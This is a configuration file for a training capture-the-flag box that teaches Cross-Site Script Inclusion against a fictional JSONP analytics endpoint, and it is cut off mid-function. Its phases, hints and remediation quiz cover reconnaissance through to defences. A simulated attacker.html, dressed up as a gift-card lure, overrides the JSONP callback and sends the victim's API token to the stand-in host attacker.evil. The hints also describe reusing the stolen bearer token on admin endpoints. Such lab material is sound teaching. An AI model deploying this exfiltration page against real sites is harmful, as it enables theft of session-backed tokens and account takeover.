/* ============================================================
   CTF ARENA -- Box F15: Silent Include
   Cross-Site Script Inclusion (XSSI) Attack
   Config: DataVault Corp analytics dashboard, JSONP endpoint,
           attacker page, callback override, token extraction,
           privilege escalation, remediation
   ============================================================ */

const F15Config = {

    // =====================================================
    // BOX METADATA
    // =====================================================

    title: 'Silent Include',
    subtitle: 'Cross-Site Script Inclusion (XSSI) Attack',
    difficulty: 'Intermediate',
    accent: '#a855f7',
    storageKey: 'hexworth_ctf_f15',
    registryId: 'f15-silent-include',
    trackerKey: 'ctf_f15',

    // =====================================================
    // PHASE SYSTEM (Multi-layer attack chain)
    // =====================================================

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '<img src="/assets/images/icons/icon-search.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Examine the DataVault Corp web application. Find the JSONP endpoint. Identify that it returns Content-Type: application/javascript with authenticated user data.',
            requiredFlags: [],
            mitre: ['T1592.002', 'T1590.006'],
            unlocks: ['exploitation'],
            locked: false
        },
        {
            id: 'exploitation',
            name: 'Exploitation',
            icon: '<img src="/assets/images/icons/icon-fire.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Craft an attacker page that includes the victim\'s JavaScript endpoint. Override the callback function to capture the data. Extract the admin user\'s API token.',
            requiredFlags: ['recon'],
            mitre: ['T1539', 'T1059.007'],
            unlocks: ['escalation'],
            locked: true
        },
        {
            id: 'escalation',
            name: 'Escalation',
            icon: '<img src="/assets/images/icons/icon-gear.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Use the stolen token to access a privileged endpoint. Discover additional user records being served as dynamic JavaScript.',
            requiredFlags: ['script_exec', 'token'],
            mitre: ['T1528', 'T1530'],
            unlocks: ['remediation'],
            locked: true
        },
        {
            id: 'remediation',
            name: 'Remediation',
            icon: '<img src="/assets/images/icons/icon-shield.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Identify and document all security failures. Answer questions about proper defenses against XSSI.',
            requiredFlags: ['escalation_priv'],
            mitre: ['T1562.001'],
            unlocks: [],
            locked: true
        }
    ],

    // =====================================================
    // TUTORIAL MODE
    // =====================================================

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Browse the DataVault application',
                tip: 'Open Firefox and navigate to http://10.10.15.20. Look at the dashboard and find API endpoints in the page source.',
                trigger: { event: 'command', match: { cmd: 'contains:curl' } }
            },
            {
                title: 'Probe the JSONP endpoint',
                tip: 'Run: curl -v http://10.10.15.20/api/v2/dashboard-stats.js to see the Content-Type header and response body.',
                trigger: { event: 'command', match: { cmd: 'contains:dashboard-stats' } }
            },
            {
                title: 'Craft the attacker page',
                tip: 'Edit /home/attacker/exploit/attacker.html to define window.dashboardCallback before the script tag that includes the JSONP endpoint.',
                trigger: { event: 'command', match: { cmd: 'contains:attacker.html' } }
            },
            {
                title: 'Submit the recon flag',
                tip: 'Once you have identified the JSONP endpoint and its Content-Type, submit the recon flag via the Flag panel.',
                trigger: { event: 'flag_correct', match: { flagId: 'recon' } }
            },
            {
                title: 'Execute the XSSI attack and extract the token',
                tip: 'Run the attacker page simulation. The callback override will capture the API token. Submit the script_exec and token flags.',
                trigger: { event: 'flag_correct', match: { flagId: 'token' } }
            },
            {
                title: 'Use the stolen token for privilege escalation',
                tip: 'Use the captured API token to call /api/v2/admin/users. Then document all defenses for the remediation flag.',
                trigger: { event: 'flag_correct', match: { flagId: 'remediation' } }
            }
        ]
    },

    // =====================================================
    // CERT OBJECTIVES (Assessment Mode)
    // =====================================================

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'recon',           objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- Cross-Site Script Inclusion reconnaissance', skill: 'JSONP Endpoint Identification' },
            { flagId: 'script_exec',     objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- Same-origin policy bypass via script inclusion', skill: 'XSSI Callback Override Technique' },
            { flagId: 'token',           objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with application attacks -- Sensitive data exfiltration via JSONP', skill: 'JSONP Token Extraction' },
            { flagId: 'escalation_priv', objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- Privilege escalation using stolen bearer tokens', skill: 'Token-based Privilege Escalation' },
            { flagId: 'remediation',     objective: '3.1', description: 'Given a scenario, implement secure application design -- JSONP replacement and CORS policy hardening', skill: 'XSSI Remediation Documentation' }
        ]
    },

    // =====================================================
    // BOOT SEQUENCE
    // =====================================================

    boot: {
        biosLines: [
            'HEXWORTH PENTEST WORKSTATION BIOS v4.1.0',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/nvme0n1 (512GB NVMe SSD)',
            'GPU: Intel UHD 770 (headless capable)',
            'Network: Intel I219-V GbE -- Link up (1Gbps)',
            'USB: Rubber Ducky detected on /dev/ttyACM0',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/nvme0n1p2',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux (Web Attack Edition)',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'attacker'
    },

    // =====================================================
    // DESKTOP ICONS
    // =====================================================

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '<img src="/assets/images/icons/icon-terminal.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '<img src="/assets/images/icons/icon-globe.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'browser' },
            { id: 'notes',    label: 'Notes',       icon: '<img src="/assets/images/icons/icon-clipboard.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'notes' },
            { id: 'hints',    label: 'Hints',       icon: '<img src="/assets/images/icons/icon-info.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '<img src="/assets/images/icons/icon-flag.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'flags' }
        ]
    },

    // =====================================================
    // TERMINAL CONFIG
    // =====================================================

    terminal: {
        user: 'attacker',
        hostname: 'kali',
        startDir: '/home/attacker',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nMission: Cross-Site Script Inclusion (XSSI) -- DataVault Corp\nTarget: http://10.10.15.20\nTarget source in /home/attacker/target-recon/\nExploit workspace in /home/attacker/exploit/\nTools: curl, xssi-probe, python3\n'
    },

    // =====================================================
    // INTERNAL STATE ENGINE
    // Tracks XSSI discovery and exploitation milestones
    // =====================================================

    _datavault: {
        endpointDiscovered: false,
        callbackOverridden: false,
        tokenExtracted: false,
        privilegeEscalated: false,
        remediationDocumented: false
    },

    // =====================================================
    // FLAGS
    // =====================================================

    flags: [
        { id: 'recon',           points: 75  },
        { id: 'script_exec',     points: 100 },
        { id: 'token',           points: 125 },
        { id: 'escalation_priv', points: 150 },
        { id: 'remediation',     points: 100 }
    ],

    // =====================================================
    // SCORING
    // =====================================================

    scoring: {
        base: 1000,
        maxScore: 550,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 1800
    },

    // =====================================================
    // HINTS (3 per phase = 4 phases = 12 hints, grouped)
    // =====================================================

    hints: [
        // --- Recon hints ---
        {
            id: 'hint-r1',
            text: 'Start by reading /home/attacker/target-recon/sitemap.txt. It lists all known endpoints on DataVault. Then curl the main dashboard at http://10.10.15.20 and read the HTML source to find the JSONP callback parameter.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint-r2',
            text: 'The JSONP endpoint is at /api/v2/dashboard-stats.js. It accepts a query parameter named "callback". Check the Content-Type header: it returns "application/javascript" not "application/json". This means the browser will execute it as code when loaded via a script tag.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-r3',
            text: 'Run: curl -v "http://10.10.15.20/api/v2/dashboard-stats.js?callback=testFn" and inspect the response. The server wraps the JSON payload inside a function call: testFn({...data...}). The data contains an API token for the requesting user. This is the XSSI vulnerability.',
            cost: 40,
            penalty: -40
        },
        // --- Exploitation hints ---
        {
            id: 'hint-e1',
            text: 'Edit /home/attacker/exploit/attacker.html. Before including the victim script tag, define window.dashboardCallback = function(data) { exfiltrate(data); }. When a victim browser loads your page, their authenticated session will be used to fetch the JSONP endpoint.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-e2',
            text: 'Run: xssi-probe simulate to see the exploit in action. The tool simulates a victim browser loading your attacker page, includes the JSONP endpoint with the victim\'s session cookie, and captures what the callback receives.',
            cost: 40,
            penalty: -40
        },
        {
            id: 'hint-e3',
            text: 'The API token in the JSONP response is the field "api_token". After xssi-probe simulate succeeds, the captured data will appear in /home/attacker/exploit/captured.json. The api_token field is the flag.',
            cost: 60,
            penalty: -60
        },
        // --- Escalation hints ---
        {
            id: 'hint-s1',
            text: 'Use the captured api_token as a Bearer token: curl -H "Authorization: Bearer <token>" http://10.10.15.20/api/v2/admin/users. This endpoint requires admin privileges, which the stolen token provides.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-s2',
            text: 'The /api/v2/admin/users endpoint returns user data as a JavaScript file too -- not JSON. It starts with: adminUsersCallback([...]). This means it is also XSSI-vulnerable via the same script inclusion technique.',
            cost: 40,
            penalty: -40
        },
        {
            id: 'hint-s3',
            text: 'Run: xssi-probe admin-scan to test /api/v2/admin/users for XSSI vulnerability. The tool will confirm that SVG and JSONP both serve sensitive data without X-Content-Type-Options: nosniff or XSSI prefix protection.',
            cost: 60,
            penalty: -60
        },
        // --- Remediation hints ---
        {
            id: 'hint-m1',
            text: 'Open /home/attacker/exploit/remediation-template.txt. There are four defense categories to fill in: (1) Replace JSONP, (2) SameSite cookies, (3) XSSI prefix, (4) Content-Type headers. Run: remediation-check to see which ones DataVault has and has not implemented.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint-m2',
            text: 'The four correct defenses are: (1) Use fetch() with CORS instead of JSONP, (2) Set cookies with SameSite=Strict, (3) Prefix JSON responses with )]}\'\\n to break script execution, (4) Set Content-Type: application/json and X-Content-Type-Options: nosniff.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-m3',
            text: 'Run: python3 /home/attacker/tools/remediation-quiz.py and answer all four questions correctly. The remediation flag is awarded when all answers are correct. The tool also explains why each defense works at the browser security model level.',
            cost: 40,
            penalty: -40
        }
    ],

    // =====================================================
    // LORE
    // =====================================================

    lore: {
        intro: 'DataVault Corp built their analytics dashboard in 2014 using JSONP for cross-origin data sharing -- a technique invented to work around the same-origin policy in an era before CORS existed. By 2024, the dashboard had accumulated 40,000 enterprise users, each with a high-privilege API token served directly in the JSONP response. No one ever removed the JSONP endpoint. The WAF blocks SQL injection and XSS payloads, but XSSI is invisible to it: the attack is just a script tag.',
        scenario: 'The DataVault security team runs a best-in-class WAF and a bug bounty program. They blocked reflected XSS, stored XSS, and CSRF with SameSite cookies. What they missed is that their analytics API still speaks JSONP -- a format specifically designed to bypass the same-origin policy. An attacker who hosts a malicious page can cause any victim who visits it to silently load DataVault\'s authenticated JavaScript endpoint. The callback function they define runs with the victim\'s data. The WAF never sees the attack.',
        outro: 'The admin token has been exfiltrated. Zero WAF alerts fired. The attack is logged only in the victim browser\'s network tab, which no one is watching. The lesson: JSONP is not a legacy curiosity. It is a gaping hole in any application that still uses it. SameSite cookies block CSRF but not XSSI. The same-origin policy does not apply to script tags. These are browser fundamentals that every backend developer must internalize.',
        ecer: {
            executive: 'Management approved a 2014-era API design without a scheduled review, assuming that WAF coverage meant the application was secure against cross-origin attacks',
            culture: 'Engineering culture treated JSONP as a solved problem -- "it works, don\'t touch it" -- despite the deprecation of the technique by every major browser vendor and framework',
            employee: 'The developer who built the JSONP endpoint left the company in 2017. No one on the current team fully understood why the endpoint existed or that it bypassed the same-origin policy',
            regulatory: 'No periodic security review of API endpoint design was required. The bug bounty program excluded XSSI from scope because the security team did not recognize it as a valid attack class'
        }
    },

    // =====================================================
    // WEB APP -- DataVault Corp (browser simulation)
    // =====================================================

    webApp: {
        startUrl: 'http://10.10.15.20/',

        pages: {
            '/': {
                title: 'DataVault Corp -- Analytics Dashboard',
                html: `
                    <div style="background:#1e1e2e;min-height:100%;padding:0;margin:0;">
                        <div style="background:#2a2a3e;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #a855f7;">
                            <div style="color:#a855f7;font-weight:700;font-size:1rem;letter-spacing:0.05em;">DataVault Corp</div>
                            <div style="color:#94a3b8;font-size:0.7rem;">admin@datavault.corp | <span style="color:#a855f7;">Enterprise</span></div>
                        </div>
                        <div style="padding:20px;">
                            <h2 style="color:#e2e8f0;font-size:0.9rem;margin-bottom:16px;font-weight:600;">Analytics Dashboard</h2>
                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;">
                                <div style="background:#2a2a3e;border:1px solid #3f3f5c;border-radius:6px;padding:14px;">
                                    <div style="color:#94a3b8;font-size:0.65rem;margin-bottom:4px;">TOTAL USERS</div>
                                    <div style="color:#a855f7;font-size:1.4rem;font-weight:700;">41,892</div>
                                </div>
                                <div style="background:#2a2a3e;border:1px solid #3f3f5c;border-radius:6px;padding:14px;">
                                    <div style="color:#94a3b8;font-size:0.65rem;margin-bottom:4px;">API CALLS TODAY</div>
                                    <div style="color:#a855f7;font-size:1.4rem;font-weight:700;">1,247,003</div>
                                </div>
                            </div>
                            <div style="background:#2a2a3e;border:1px solid #3f3f5c;border-radius:6px;padding:14px;margin-bottom:12px;">
                                <div style="color:#94a3b8;font-size:0.7rem;margin-bottom:8px;font-weight:600;">QUICK API REFERENCE</div>
                                <div style="font-family:monospace;font-size:0.7rem;color:#a3e635;line-height:1.9;">
                                    GET  /api/v2/dashboard-stats.js?callback=&lt;fn&gt;&nbsp;&nbsp;-- Dashboard data (JSONP)<br>
                                    GET  /api/v2/user-profile.js?callback=&lt;fn&gt;&nbsp;&nbsp;&nbsp;&nbsp;-- User profile (JSONP)<br>
                                    POST /api/v2/data-export&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-- CSV export<br>
                                    GET  /api/v2/admin/users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-- Admin: user list
                                </div>
                            </div>
                            <div style="color:#475569;font-size:0.6rem;font-family:monospace;">
                                DataVault Analytics Engine v3.7.2 -- Node.js 18.17.1 -- Legacy JSONP bridge enabled for client compat
                            </div>
                        </div>
                    </div>
                `
            },

            '/api/v2/dashboard-stats.js': {
                title: 'DataVault -- API: dashboard-stats.js',
                html: `
                    <div style="max-width:640px;margin:0 auto;padding:20px;">
                        <h1 style="color:#a855f7;font-size:1.1rem;margin-bottom:10px;">JSONP Endpoint: /api/v2/dashboard-stats.js</h1>
                        <p style="color:#64748b;font-size:0.78rem;line-height:1.6;margin-bottom:14px;">
                            Accepts a <code>callback</code> query parameter. Returns authenticated dashboard statistics
                            wrapped in a JavaScript function call. Served with Content-Type: application/javascript.
                        </p>
                        <div style="background:#1e1e2e;color:#a3e635;padding:14px;border-radius:6px;font-family:monospace;font-size:0.72rem;line-height:1.8;">
                            HTTP/1.1 200 OK<br>
                            Content-Type: application/javascript<br>
                            Cache-Control: no-store<br>
                            <br>
                            dashboardCallback({<br>
                            &nbsp;&nbsp;"user": "admin@datavault.corp",<br>
                            &nbsp;&nbsp;"role": "admin",<br>
                            &nbsp;&nbsp;"api_token": "dvt_adm_9K2xPqR7mL4nV1wZ8jT3",<br>
                            &nbsp;&nbsp;"total_users": 41892,<br>
                            &nbsp;&nbsp;"api_calls_today": 1247003,<br>
                            &nbsp;&nbsp;"plan": "Enterprise",<br>
                            &nbsp;&nbsp;"billing_email": "finance@datavault.corp"<br>
                            });<br>
                            <br>
                            <span style="color:#fbbf24;">// Note: callback parameter overrides default "dashboardCallback"</span><br>
                            <span style="color:#fbbf24;">// ?callback=myFn returns: myFn({...same data...});</span><br>
                            <span style="color:#fbbf24;">// No CORS headers. No X-Content-Type-Options. No XSSI prefix.</span>
                        </div>
                    </div>
                `
            },

            '/api/v2/admin/users': {
                title: 'DataVault -- API: admin/users',
                html: `
                    <div style="max-width:640px;margin:0 auto;padding:20px;">
                        <h1 style="color:#a855f7;font-size:1.1rem;margin-bottom:10px;">Privileged Endpoint: /api/v2/admin/users</h1>
                        <p style="color:#64748b;font-size:0.78rem;line-height:1.6;margin-bottom:14px;">
                            Requires a valid admin Bearer token. Returns user records as a JavaScript file
                            (also JSONP-capable) -- the same XSSI vulnerability applies here.
                        </p>
                        <div style="background:#1e1e2e;color:#a3e635;padding:14px;border-radius:6px;font-family:monospace;font-size:0.72rem;line-height:1.8;">
                            HTTP/1.1 200 OK<br>
                            Content-Type: application/javascript<br>
                            <br>
                            adminUsersCallback([<br>
                            &nbsp;&nbsp;{"id":1,"email":"admin@datavault.corp","role":"admin","token":"dvt_adm_9K2xPqR7mL4nV1wZ8jT3"},<br>
                            &nbsp;&nbsp;{"id":2,"email":"ceo@datavault.corp","role":"admin","token":"dvt_adm_5Qn8Yb2KpR6mD9sE1fH4"},<br>
                            &nbsp;&nbsp;{"id":3,"email":"ops@datavault.corp","role":"operator","token":"dvt_ops_3Lx7Vc4NwA8tG2qJ5kM0"},<br>
                            &nbsp;&nbsp;{"id":4,"email":"finance@datavault.corp","role":"viewer","token":"dvt_vie_6Rz1Us9BdC3eF7hI2jK8"}<br>
                            ]);<br>
                            <br>
                            <span style="color:#fbbf24;">// This endpoint is ALSO XSSI-vulnerable.</span><br>
                            <span style="color:#fbbf24;">// An attacker with admin scope can exfiltrate ALL user tokens.</span>
                        </div>
                    </div>
                `
            },

            '/api/v2/user-profile.js': {
                title: 'DataVault -- API: user-profile.js',
                html: `
                    <div style="max-width:640px;margin:0 auto;padding:20px;">
                        <h1 style="color:#a855f7;font-size:1.1rem;margin-bottom:10px;">JSONP Endpoint: /api/v2/user-profile.js</h1>
                        <div style="background:#1e1e2e;color:#a3e635;padding:14px;border-radius:6px;font-family:monospace;font-size:0.72rem;line-height:1.8;">
                            HTTP/1.1 200 OK<br>
                            Content-Type: application/javascript<br>
                            <br>
                            profileCallback({<br>
                            &nbsp;&nbsp;"id": 1,<br>
                            &nbsp;&nbsp;"email": "admin@datavault.corp",<br>
                            &nbsp;&nbsp;"created_at": "2021-04-15T08:22:00Z",<br>
                            &nbsp;&nbsp;"mfa_enabled": false,<br>
                            &nbsp;&nbsp;"last_login": "2026-04-11T14:03:17Z",<br>
                            &nbsp;&nbsp;"api_quota_remaining": 998753<br>
                            });<br>
                            <br>
                            <span style="color:#fbbf24;">// Three JSONP endpoints. Zero CORS. Zero XSSI mitigations.</span>
                        </div>
                    </div>
                `
            }
        }
    },

    // =====================================================
    // FILESYSTEM (attacker workstation)
    // =====================================================

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'attacker': {
                            type: 'dir',
                            children: {
                                'target-recon': {
                                    type: 'dir',
                                    children: {
                                        'sitemap.txt': {
                                            type: 'file',
                                            content: '=== DataVault Corp -- Passive Recon Sitemap ===\nTarget: http://10.10.15.20\nDate: 2026-04-12\n\nDISCOVERED ENDPOINTS:\n\n  [PUBLIC]\n  GET  /                                     -- Main dashboard (auth required)\n  GET  /login                                -- Login page\n  GET  /logout                               -- Logout\n\n  [API v2 -- JSONP ENDPOINTS]\n  GET  /api/v2/dashboard-stats.js            -- Dashboard stats (JSONP)\n       ?callback=<fn_name>                   -- Callback param (overrideable!)\n       Content-Type: application/javascript  -- EXECUTED BY BROWSER AS CODE\n\n  GET  /api/v2/user-profile.js               -- User profile (JSONP)\n       ?callback=<fn_name>                   -- Same pattern\n\n  [API v2 -- ADMIN]\n  GET  /api/v2/admin/users                   -- All user records\n       Authorization: Bearer <token>         -- Requires admin token\n       Content-Type: application/javascript  -- Also a JS file!\n\n  [DATA OPERATIONS]\n  POST /api/v2/data-export                   -- CSV export (not JSONP)\n  GET  /api/v2/status                        -- Health check\n\nOBSERVATIONS:\n  - No X-Content-Type-Options header on any endpoint\n  - No XSSI prefix (no ")]}\'\\n" or "while(1);" before JSON)\n  - JSONP callback parameter is NOT sanitized (reflected directly)\n  - Authentication: session cookie (HttpOnly, but NOT SameSite)\n  - WAF: Cloudflare -- blocks XSS payloads but NOT script inclusion\n\nNOTES:\n  XSSI exploits the fact that <script src="victim.com/api.js"> sends\n  the victim\'s cookies. The WAF never sees this as malicious.\n  It is just a legitimate script load from the attacker\'s domain.\n'
                                        },
                                        'headers.txt': {
                                            type: 'file',
                                            content: '=== HTTP Response Headers -- /api/v2/dashboard-stats.js ===\n\nHTTP/1.1 200 OK\nContent-Type: application/javascript\nCache-Control: no-store, must-revalidate\nSet-Cookie: dv_session=a3b8c9d2e1f4; HttpOnly; Path=/\nVary: Accept-Encoding\nServer: nginx/1.24.0\nX-Powered-By: Express\nDate: Sat, 12 Apr 2026 10:04:33 GMT\n\nMISSING (critical):\n  X-Content-Type-Options: nosniff       -- NOT PRESENT\n  Content-Security-Policy               -- NOT PRESENT\n  CORS headers (Access-Control-*)       -- NOT PRESENT\n  XSSI prefix (")]}\' " or "while(1);") -- NOT PRESENT\n  SameSite cookie attribute             -- NOT PRESENT\n\nNote: Session cookie is HttpOnly (prevents JS access) but\nthe ABSENCE of SameSite means it IS sent on cross-origin\nrequests -- including <script src> inclusions.\nThis is the fundamental enabler of XSSI.\n'
                                        }
                                    }
                                },
                                'exploit': {
                                    type: 'dir',
                                    children: {
                                        'attacker.html': {
                                            type: 'file',
                                            content: '<!DOCTYPE html>\n<!-- ATTACKER PAGE -- Hosted on attacker.evil (not the victim domain) -->\n<!-- When a logged-in DataVault user visits this page, their browser     -->\n<!-- will execute the JSONP script with their authenticated session.     -->\n<html lang="en">\n<head>\n    <title>Win a Free Gift Card!</title>\n</head>\n<body>\n<h1>Claim Your Reward</h1>\n\n<script>\n    // STEP 1: Override the callback BEFORE the script is included.\n    // The JSONP endpoint calls dashboardCallback({...data...}).\n    // By defining it first, we intercept the victim\'s data.\n\n    window.dashboardCallback = function(data) {\n        // STEP 2: Capture the sensitive data.\n        // In a real attack this would send to: attacker.evil/collect?d=...\n        console.log("CAPTURED:", JSON.stringify(data));\n\n        // The api_token field contains the victim\'s high-privilege token.\n        // Token: " + data.api_token + "\n\n        // STEP 3: Silently exfiltrate.\n        var img = new Image();\n        img.src = "http://attacker.evil/collect?token=" + encodeURIComponent(data.api_token)\n                + "&user=" + encodeURIComponent(data.user);\n    };\n</script>\n\n<!--\n    STEP 4: Include the victim endpoint as a script.\n    The victim\'s browser sends their session cookie automatically.\n    Content-Type: application/javascript means the browser executes it.\n    The WAF sees only a normal script inclusion -- no alert fires.\n-->\n<script src="http://10.10.15.20/api/v2/dashboard-stats.js?callback=dashboardCallback"></script>\n\n</body>\n</html>\n\n<!-- TODO: Simulate with: xssi-probe simulate -->\n'
                                        },
                                        'remediation-template.txt': {
                                            type: 'file',
                                            content: '=== XSSI REMEDIATION REPORT TEMPLATE ===\nTarget: DataVault Corp (http://10.10.15.20)\nDate: 2026-04-12\n\nFILL IN EACH DEFENSE:\n\nDEFENSE 1 -- Replace JSONP:\n  Current:  GET /api/v2/dashboard-stats.js?callback=fn\n  Fixed:    [YOUR ANSWER HERE]\n  Why it works: [YOUR ANSWER HERE]\n\nDEFENSE 2 -- Cookie Security:\n  Current:  Set-Cookie: dv_session=...; HttpOnly\n  Fixed:    [YOUR ANSWER HERE]\n  Why it works: [YOUR ANSWER HERE]\n\nDEFENSE 3 -- XSSI Prefix:\n  Current:  Response body starts with: dashboardCallback({...})\n  Fixed:    [YOUR ANSWER HERE]\n  Why it works: [YOUR ANSWER HERE]\n\nDEFENSE 4 -- Content-Type Enforcement:\n  Current:  Content-Type: application/javascript (no nosniff)\n  Fixed:    [YOUR ANSWER HERE]\n  Why it works: [YOUR ANSWER HERE]\n\nRun: python3 /home/attacker/tools/remediation-quiz.py when complete.\n'
                                        },
                                        'captured.json': {
                                            type: 'file',
                                            content: '(empty -- run: xssi-probe simulate to populate this file)'
                                        }
                                    }
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'remediation-quiz.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nXSSI Remediation Quiz\nTests whether the student understands all four required defenses.\n\nUsage: python3 remediation-quiz.py\n"""\n\nANSWERS = {\n    1: ["fetch", "cors", "xmlhttprequest", "rest api with cors"],\n    2: ["samesite=strict", "samesite=lax", "samesite strict", "samesite lax"],\n    3: [")]}\' ", "while(1);", "xssi prefix", ")]}\\""],\n    4: ["application/json", "x-content-type-options: nosniff", "nosniff"]\n}\n\nQUESTIONS = [\n    "Defense 1: What should replace JSONP for cross-origin data? (describe the approach)",\n    "Defense 2: What cookie attribute prevents XSSI? (e.g. SameSite=...)",\n    "Defense 3: What prefix makes a JSON response non-executable as JS?",\n    "Defense 4: What response header tells the browser not to sniff Content-Type?"\n]\n\ndef check(answer, key):\n    a = answer.strip().lower()\n    return any(k in a for k in ANSWERS[key])\n\nprint("=" * 60)\nprint("  XSSI REMEDIATION QUIZ")\nprint("  Target: DataVault Corp")\nprint("=" * 60)\nprint()\n\nresults = []\nfor i, q in enumerate(QUESTIONS, 1):\n    print("Q%d: %s" % (i, q))\n    ans = input("Your answer: ")\n    ok = check(ans, i)\n    results.append(ok)\n    print("  %s\\n" % ("CORRECT" if ok else "INCORRECT -- review the hints"))\n\nif all(results):\n    print("  ALL DEFENSES CORRECTLY IDENTIFIED")\n    print("  Submit the remediation flag via the Flag panel.")\nelse:\n    failed = [i for i, r in enumerate(results, 1) if not r]\n    print("  Defenses %s need review. Try again." % str(failed))\n'
                                        }
                                    }
                                },
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: DataVault Corp Analytics Dashboard\nTarget URL: http://10.10.15.20\nObjective: Cross-Site Script Inclusion (XSSI) Attack\n\nINTEL:\nDataVault uses JSONP for legacy browser support.\nJSONP endpoints return Content-Type: application/javascript.\nSession cookies are HttpOnly but NOT SameSite.\nNo XSSI prefix. No X-Content-Type-Options: nosniff.\nThe WAF blocks XSS payloads -- XSSI is invisible to it.\n\nATTACK CHAIN:\n  Phase 1 -- Recon\n    1. Browse http://10.10.15.20 and read source\n    2. Find JSONP endpoints via /home/attacker/target-recon/sitemap.txt\n    3. Probe endpoint: curl -v http://10.10.15.20/api/v2/dashboard-stats.js\n    4. Confirm Content-Type: application/javascript and data in response\n    >> FLAG: recon\n\n  Phase 2 -- Exploitation\n    5. Edit /home/attacker/exploit/attacker.html to override dashboardCallback\n    6. Run: xssi-probe simulate (simulates victim browser loading attacker page)\n    >> FLAG: script_exec (callback override works)\n    >> FLAG: token (api_token field extracted)\n\n  Phase 3 -- Escalation\n    7. Use captured token: curl -H "Authorization: Bearer <token>" http://10.10.15.20/api/v2/admin/users\n    8. Discover admin/users is ALSO a JavaScript file (XSSI again)\n    9. Run: xssi-probe admin-scan to confirm additional XSSI surfaces\n    >> FLAG: escalation_priv\n\n  Phase 4 -- Remediation\n    10. Run: python3 /home/attacker/tools/remediation-quiz.py\n    11. Correctly identify all four defenses\n    >> FLAG: remediation\n\nTOOLS:\n  xssi-probe <subcmd>     : XSSI testing toolkit (probe/simulate/admin-scan)\n  curl                    : HTTP requests\n  python3 tools/remediation-quiz.py : Remediation quiz\n\nGood luck, operator.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls\ncat notes.txt\nls target-recon/\ncat target-recon/sitemap.txt\ncurl http://10.10.15.20'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'hosts': { type: 'file', content: '127.0.0.1   localhost\n10.10.15.20 datavault.corp\n10.10.15.99 attacker.evil' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\nattacker:x:1000:1000:Pentester,,,:/home/attacker:/bin/bash'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'xssi-probe.log': {
                                    type: 'file',
                                    content: '[2026-04-12T09:00:00Z] xssi-probe started\n[2026-04-12T09:01:22Z] probe: GET /api/v2/dashboard-stats.js -- Content-Type: application/javascript -- JSONP detected\n[2026-04-12T09:01:23Z] probe: No X-Content-Type-Options header\n[2026-04-12T09:01:23Z] probe: No XSSI prefix detected\n[2026-04-12T09:01:23Z] probe: Cookie SameSite attribute: MISSING\n[2026-04-12T09:01:24Z] [WARN] Endpoint is XSSI-vulnerable (CVSS 7.4)'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // =====================================================
    // TERMINAL COMMANDS (box-specific tools)
    // =====================================================

    commands: {

        // ── xssi-probe: XSSI testing toolkit ──
        'xssi-probe': function(args, term, engine) {
            const sub = args[0] || '';

            if (!sub) {
